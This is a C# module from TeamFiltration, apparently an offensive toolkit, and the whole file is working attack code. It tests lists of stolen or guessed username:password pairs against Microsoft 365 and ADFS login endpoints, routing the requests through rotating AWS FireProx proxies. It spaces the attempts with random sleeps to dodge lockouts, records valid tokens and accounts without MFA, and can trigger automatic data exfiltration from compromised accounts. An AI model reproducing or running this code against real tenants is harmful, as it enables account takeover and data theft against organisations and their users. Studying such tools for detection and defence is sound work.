using Dasync.Collections;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using TeamFiltration.Handlers;
using TeamFiltration.Helpers;
using TeamFiltration.Models.MSOL;
using TeamFiltration.Models.TeamFiltration;
using TimeZoneConverter;

namespace TeamFiltration.Modules
{
    class Validate
    {
        private static async Task<List<SprayAttempt>> SprayAttemptWrap(
           List<SprayAttempt> sprayAttempts,
           GlobalArgumentsHandler teamFiltrationConfig,
           DatabaseHandler _databaseHandler,
           UserRealmResp userRealmResp,
           int delayInSeconds = 0,
           int regionCounter = 0)
        {

            var _mainMSOLHandler = new MSOLHandler(teamFiltrationConfig, "VALIDATE", _databaseHandler);

            var validSprayAttempts = new List<SprayAttempt>() { };
            await sprayAttempts.ParallelForEachAsync(
                  async sprayAttempt =>
                  {
                      try
                      {


                          (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) loginResp = await _mainMSOLHandler.LoginSprayAttempt(sprayAttempt, userRealmResp);

                          if (!string.IsNullOrWhiteSpace(loginResp.bearerToken?.access_token))
                          {
                              if (!userRealmResp.Adfs)
                                  _databaseHandler.WriteLog(new Log("VALIDATE", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => VALID!", sprayAttempt.FireProxRegion));
                              else
                                  _databaseHandler.WriteLog(new Log("VALIDATE", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => VALID NO MFA!", sprayAttempt.FireProxRegion));
                              sprayAttempt.ResponseData = JsonConvert.SerializeObject(loginResp.bearerToken);
                              sprayAttempt.Valid = true;

                          }
                          else if (!string.IsNullOrWhiteSpace(loginResp.bearerTokenError?.error_description) && userRealmResp.Adfs)
                          {
                              if (loginResp.bearerTokenError.error_description.Contains("User does not exsists?"))
                                  sprayAttempt.Disqualified = true;

                              _databaseHandler.WriteLog(new Log("VALIDATE", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => {loginResp.bearerTokenError?.error_description}", sprayAttempt.FireProxRegion), true, true);

                              sprayAttempt.ResponseCode = loginResp.bearerTokenError?.error_description;
                              sprayAttempt.Valid = false;
                              sprayAttempt.ConditionalAccess = false;
                          }
                          else if (!string.IsNullOrWhiteSpace(loginResp.bearerTokenError?.error_description))
                          {
                              var respCode = loginResp.bearerTokenError.error_description.Split(":")[0].Trim();
                              var message = loginResp.bearerTokenError.error_description.Split(":")[1].Trim();

                              //Set a default response
                              var errorCodeOut = (msg: $"UNKNOWN {respCode}", valid: false, disqualified: false, accessPolicy: false);

                              //Try to parse
                              Helpers.Generic.GetErrorCodes().TryGetValue(respCode, out errorCodeOut);

                              //Write result
                              var printLogBool = (errorCodeOut.accessPolicy || errorCodeOut.valid || errorCodeOut.disqualified);

                              if (!string.IsNullOrEmpty(errorCodeOut.msg))
                                  _databaseHandler.WriteLog(new Log("VALIDATE", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => {errorCodeOut.msg}", sprayAttempt.FireProxRegion), true, true);
                              else
                                  _databaseHandler.WriteLog(new Log("VALIDATE", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => {respCode.Trim()}", sprayAttempt.FireProxRegion), true, true);

                              //If we get a valid response, parse and set the token data as json
                              if (errorCodeOut.valid)
                                  sprayAttempt.ResponseData = JsonConvert.SerializeObject(loginResp.bearerToken);

                              sprayAttempt.ResponseCode = respCode;
                              sprayAttempt.Valid = errorCodeOut.valid;
                              sprayAttempt.Disqualified = errorCodeOut.disqualified;
                              sprayAttempt.ConditionalAccess = errorCodeOut.accessPolicy;

                          }
                          else
                          {
                              _databaseHandler.WriteLog(new Log("VALIDATE", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => UNKNOWN or malformed response!", sprayAttempt.FireProxRegion));

                          }

                          if (sprayAttempt.Valid)
                              validSprayAttempts.Add(sprayAttempt);

                          _databaseHandler.WriteSprayAttempt(sprayAttempt, teamFiltrationConfig);
                          Thread.Sleep(delayInSeconds * 1000);
                      }
                      catch (Exception ex)
                      {
                          _databaseHandler.WriteLog(new Log("VALIDATE", $"SOFT ERROR when spraying  {sprayAttempt.Username}:{sprayAttempt.Password} => {ex.Message}", sprayAttempt.FireProxRegion));

                      }
                      _databaseHandler._globalDatabase.Checkpoint();
                  },
                            maxDegreeOfParallelism: 20);



            return validSprayAttempts;
        }

        public static async Task ValidateAsync(string[] args)
        {
            Random rnd = new Random();

            var forceBool = args.Contains("--force");

            int sleepInMinutesMax = 100;
            int sleepInMinutesMin = 60;

            var userPassListPath = args.GetValue("--userpasslist");

            var shuffleUsersBool = args.Contains("--shuffle-users");
            bool shufflePasswordsBool = args.Contains("--shuffle-passwords");
            bool shuffleFireProxBool = args.Contains("--shuffle-regions");
            bool autoExfilBool = args.Contains("--auto-exfil");
            int delayInSeconds = 0;
            //Calcuate sleep time from minutes to ms
            if (args.Contains("--sleep-max"))
            {
                sleepInMinutesMax = Convert.ToInt32(args.GetValue("--sleep-max"));
            }

            if (args.Contains("--sleep-min"))
            {
                sleepInMinutesMin = Convert.ToInt32(args.GetValue("--sleep-min"));
            }

            if (args.Contains("--jitter"))
            {
                delayInSeconds = Convert.ToInt32(args.GetValue("--jitter"));
            }

            var credentialPairs = new List<(string Username, string Password)>();
            var databaseHandle = new DatabaseHandler(args);
            var _globalProperties = new Handlers.GlobalArgumentsHandler(args, databaseHandle);

            if (string.IsNullOrEmpty(userPassListPath))
            {
                Console.WriteLine($"[!] No user:pass list supplied");
                Environment.Exit(0);
            }

            databaseHandle.WriteLog(new Log("VALIDATE", $"Parsing credential list"!));

            //populate the list of username:password pairs from the provided file 
            credentialPairs = File.ReadLines(userPassListPath)
            .Select(line => line.Split(':'))
            .Where(parts => parts.Length == 2)
            .Select(parts => (Username: parts[0].Trim(), Password: parts[1].Trim()))
            .ToList();

            //check if we have validated the users
            var validUsernames = new HashSet<string>(databaseHandle.QueryValidAccount().Select(x => x.Username.ToLower()).Distinct().ToList());
            // Separate users into valid and invalid lists
            var invalidUsers = credentialPairs.Where(u => !validUsernames.Contains(u.Username.ToLower())).ToList();
            credentialPairs = credentialPairs.Where(u => validUsernames.Contains(u.Username)).ToList();

            //we now have valid users in credentialPairs and invalid users in invalidUsers.
            if (invalidUsers.Count > 0)
            {
                Console.WriteLine($"[!] {invalidUsers.Count} invalid users detected. These users will not be attempted");
            }

            //check for duplicates. we dont allow those
            var duplicateUsers = credentialPairs
                .GroupBy(up => up.Username)
                .Where(g => g.Count() > 1)
                .SelectMany(g => g.Skip(1)) // Select all but the first occurrence
                .ToList();

            if (duplicateUsers.Count > 0)
            {
                Console.WriteLine($"[!] The user:pass list contains duplicate entries. We can't let you do that.");
                databaseHandle.WriteLog(new Log("VALIDATE", $"Removing duplicates from provided list."!));

                credentialPairs = credentialPairs
                .GroupBy(up => up.Username)
                .Select(g => g.First()) // Keep the first occurrence only
                .ToList();

                // Get the directory part (e:\foo)
                string directory = Path.GetDirectoryName(userPassListPath);

                // Initialize the base file name
                string baseFileName = "duplicates.txt";
                string newFilePath = Path.Combine(directory, baseFileName);

                // Initialize a counter to add to the file name if it already exists
                int counter = 1;

                // Check if the file exists, and keep incrementing the counter until we find an available file name
                while (File.Exists(newFilePath))
                {
                    newFilePath = Path.Combine(directory, $"duplicates{counter}.txt");
                    counter++;
                }

                using (StreamWriter writer = new StreamWriter(newFilePath))
                {
                    foreach (var entry in duplicateUsers)
                    {
                        writer.WriteLine($"{entry.Username}:{entry.Password}");
                    }
                }

                databaseHandle.WriteLog(new Log("VALIDATE", $"Removed duplicates writen to {newFilePath}"!));

            }

            //Pick the first user to enumerate some basic information about the Tenant
            var getUserRealmResult = await Helpers.Generic.CheckUserRealm(credentialPairs.FirstOrDefault().Username, _globalProperties);

            if (getUserRealmResult.UsGovCloud)
            {
                databaseHandle.WriteLog(new Log("VALIDATE", $"US GOV Tenant detected - Updating spraying endpoint from .com => .us"));
                _globalProperties.UsCloud = true;
            }

            if (getUserRealmResult.ThirdPartyAuth && !getUserRealmResult.Adfs)
            {
                databaseHandle.WriteLog(new Log("VALIDATE", $"Third party authentication detected - Spraying will NOT work properly, sorry!\nThird-Party Authentication url: " + getUserRealmResult.ThirdPartyAuthUrl));
                Environment.Exit(0);
            }

            //Check if this client has ADFS
            if (getUserRealmResult.Adfs && !_globalProperties.AADSSO)
            {
                databaseHandle.WriteLog(new Log("VALIDATE", $"ADFS federation detected => {getUserRealmResult.ThirdPartyAuthUrl}"));
                databaseHandle.WriteLog(new Log("VALIDATE", $"TeamFiltration ADFS support in beta, be carefull :) "));
                _globalProperties.ADFS = true;
            }

        sprayCalc:
            var listOfSprayAttempts = new List<SprayAttempt>() { };

            //Query Disqualified accounts
            List<SprayAttempt> diqualifiedAccounts = databaseHandle.QueryDisqualified();

            //Remove Disqualified accounts from the spray list
            var bufferuserNameList = credentialPairs.Where(c => !diqualifiedAccounts.Any(sa => sa.Username == c.Username)).ToList();

            //check we have any accounts left
            if (bufferuserNameList.Count == 0)
            {
                databaseHandle.WriteLog(new Log("VALIDATE", $"No valid accounts remaining after excluding previously disqualified accounts"));
                Environment.Exit(0);
            }

            //Generate a random sleep time based on min-max
            var currentSleepTime = (new Random()).Next(sleepInMinutesMin, sleepInMinutesMax);
            var regionCounter = rnd.Next(_globalProperties.AWSRegions.Length - 1);

            //Query emails that has been sprayed in the last X minutes (based on sleep time)
            var accountsRecentlySprayed = databaseHandle.QuerySprayAttempts(currentSleepTime).OrderByDescending(x => x?.DateTime).ToList();

            //If all accounts has been sprayed in the last 90 minutes, and we are not forcing sprays, sleep
            if (accountsRecentlySprayed.Select(x => x.Username.ToLower()).Distinct().Count() >= bufferuserNameList.Count() && !forceBool)
            {
                //Find spray attempt most recent
                var mostRecentAccountSprayed = accountsRecentlySprayed.OrderByDescending(x => x?.DateTime).FirstOrDefault().DateTime;

                //Minute since that
                int minutesSinceFirstAccountSprayed = Convert.ToInt32(DateTime.Now.Subtract(mostRecentAccountSprayed).TotalMinutes);

                //time left to sleep based on this
                int timeLeftToSleep = currentSleepTime - minutesSinceFirstAccountSprayed;
                TimeZoneInfo easternZone = TZConvert.GetTimeZoneInfo("Eastern Standard Time");


                databaseHandle.WriteLog(new Log("VALIDATE", $"{minutesSinceFirstAccountSprayed}m since last spray, spraying will resume {TimeZoneInfo.ConvertTimeFromUtc(DateTime.UtcNow.AddMinutes(timeLeftToSleep), easternZone)} EST"));
                Thread.Sleep((int)TimeSpan.FromMinutes(timeLeftToSleep).TotalMilliseconds);
                goto sprayCalc;
            }
            //If we are forcing spray, go ahead
            else if (forceBool)
            {   //however only force one round
                forceBool = false;
            }
            else if (accountsRecentlySprayed.Count() > 0)
            {   //Since we are finishing up a previous spray, remove the ones to not hit
                bufferuserNameList = bufferuserNameList.Where(x => !accountsRecentlySprayed.Any(rs => rs.Username == x.Username)).ToList();
                databaseHandle.WriteLog(new Log("VALDIATE", $"Uneven spray round detected"));
            }
            //Get all previous password and email combinations
            List<string> allCombos = databaseHandle.QueryAllCombos();

            var fireProxList = new List<(Amazon.APIGateway.Model.CreateDeploymentRequest, Models.AWS.FireProxEndpoint, string fireProxUrl)>();

            if (shuffleUsersBool)
                bufferuserNameList = bufferuserNameList.Randomize().ToList();

            for (int regionCount = 0; regionCount < _globalProperties.AWSRegions.Length; regionCount++)
            {
                if (_globalProperties.AADSSO)
                    fireProxList.Add(_globalProperties.GetFireProxURLObject("https://autologon.microsoftazuread-sso.com", regionCount));
                else if (_globalProperties.UsCloud)
                {
                    var fireProxObject = _globalProperties.GetFireProxURLObject("https://login.microsoftonline.us", regionCount);
                    fireProxObject.fireProxUrl = fireProxObject.fireProxUrl + "common/oauth2/token";
                    fireProxList.Add(fireProxObject);


                }
                else if (_globalProperties.ADFS)
                {
                    Uri adfsHost = new Uri(getUserRealmResult.ThirdPartyAuthUrl);
                    (Amazon.APIGateway.Model.CreateDeploymentRequest, Models.AWS.FireProxEndpoint, string fireProxUrl) adfsFireProxObject = _globalProperties.GetFireProxURLObject($"https://{adfsHost.Host}", regionCount);
                    string adfsFireProxUrl = adfsFireProxObject.fireProxUrl.TrimEnd('/') + $"{adfsHost.PathAndQuery}";
                    adfsFireProxObject.fireProxUrl = adfsFireProxUrl;
                    fireProxList.Add(adfsFireProxObject);
                }

                else
                {
                    var fireProxObject = _globalProperties.GetFireProxURLObject("https://login.microsoftonline.com", regionCount);
                    fireProxObject.fireProxUrl = fireProxObject.fireProxUrl + "common/oauth2/token";
                    fireProxList.Add(fireProxObject);
                }

                if (!shuffleFireProxBool)
                    break;
            }



            if (shufflePasswordsBool)
                bufferuserNameList = bufferuserNameList.Randomize().ToList();


            foreach (var candidate in bufferuserNameList)
            {
                var fireProxObject = fireProxList.First();

                if (shuffleFireProxBool)
                    fireProxObject = fireProxList.Randomize().First();

                //If this combo does NOT exsits, add it
                if (!allCombos.Contains(candidate.Username.ToLower() + ":" + candidate.Password))
                {
                    var randomResource = Helpers.Generic.RandomO365Res();

                    listOfSprayAttempts.Add(new SprayAttempt()
                    {

                        Username = candidate.Username,
                        Password = candidate.Password,
                        //ComboHash = "",
                        FireProxURL = fireProxObject.fireProxUrl,
                        FireProxRegion = fireProxObject.Item2.Region,
                        ResourceClientId = randomResource.clientId,
                        ResourceUri = randomResource.Uri,
                        AADSSO = _globalProperties.AADSSO,
                        ADFS = getUserRealmResult.Adfs
                    });
                }
            }


            if (_globalProperties.AWSRegions.Length - 1 == regionCounter)
                regionCounter = 0;
            else
                regionCounter++;

            //If i get to this point without any spray items in listOfSprayAttempts,i have nothing left
            if (listOfSprayAttempts.Count() == 0)
            {
                foreach (var fireProxObject in fireProxList)
                {
                    await _globalProperties._awsHandler.DeleteFireProxEndpoint(fireProxObject.Item1.RestApiId, fireProxObject.Item2.Region);
                    Environment.Exit(0);
                }
            }


            var validAccounts = await SprayAttemptWrap(listOfSprayAttempts, _globalProperties, databaseHandle, getUserRealmResult, delayInSeconds, regionCounter);

            foreach (var fireProxObject in fireProxList)
            {
                await _globalProperties._awsHandler.DeleteFireProxEndpoint(fireProxObject.Item1.RestApiId, fireProxObject.Item2.Region);
            }


            if (autoExfilBool && validAccounts.Count() > 0)
            {
                foreach (var item in validAccounts)
                {
                    databaseHandle.WriteLog(new Log("VERIFY", $"Launching automatic exfiltration"));
                    await Exfiltrate.ExfiltrateAsync(args, item.Username, databaseHandle);
                }

            }
        }
    }
}
